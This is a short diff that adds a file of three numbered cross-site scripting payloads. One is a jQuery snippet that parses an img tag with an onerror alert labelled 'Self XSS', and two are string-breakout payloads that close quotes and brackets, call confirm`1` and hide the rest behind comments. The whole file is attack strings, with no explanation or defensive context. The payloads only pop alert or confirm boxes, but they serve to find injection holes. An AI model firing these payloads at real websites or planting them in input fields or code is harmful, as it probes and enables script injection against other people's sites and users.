@@ -1,0 +1,5 @@
+1.var x = $("<div/>").html('<img src="x" onerror="alert(\'Self XSS\');" />').text(); console.log(x);
+
+2.\”}})})-confirm`1`(a=>{({b:{/*/// 
+
+3.\”}})})-confirm`1`/*/ 
